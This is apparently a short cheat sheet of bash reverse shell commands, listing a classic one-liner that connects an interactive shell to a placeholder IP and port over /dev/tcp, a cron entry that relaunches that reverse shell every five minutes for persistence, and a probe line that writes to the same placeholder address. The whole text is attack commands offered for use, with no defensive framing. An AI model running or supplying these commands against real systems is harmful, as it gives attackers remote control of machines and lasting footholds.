# Classic 
bash -i >& /dev/tcp/<IP>/<port> 0>&1
# Inside script or cronjob
*/5 * * * * bash -c 'bash -i >& /dev/tcp/<IP>/<port> 0>&1'
# Manual probing
echo "test" > /dev/tcp/<IP>/<port>
